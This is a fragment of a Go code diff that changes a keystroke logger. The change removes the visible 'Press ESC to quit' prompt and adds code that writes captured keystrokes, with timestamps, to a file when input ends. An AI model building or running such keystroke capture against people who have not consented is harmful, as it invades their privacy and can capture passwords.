@@ -19,16 +19,17 @@ func StartKeyboardLogger() {
 	if err := keyboard.Open(); err != nil {
 		panic(err)
 	}
-	defer func() {
-		_ = keyboard.Close()
-	}()
 
-	fmt.Println("Press ESC to quit")
 	currentStr := ""
 	for {
 		char, key, err := keyboard.GetKey()
 		if err != nil {
-			panic(err)
+			keyboard.Close()
+			if len(currentStr) > 0 {
+				file.WriteString(fmt.Sprintf("%s: WriteChar = %s: String = %s \n \n", time.Now().String(), "keyboard_terminated", currentStr))
+
+			}
+			break
 		}
 		if key == keyboard.KeyEsc {
 			break
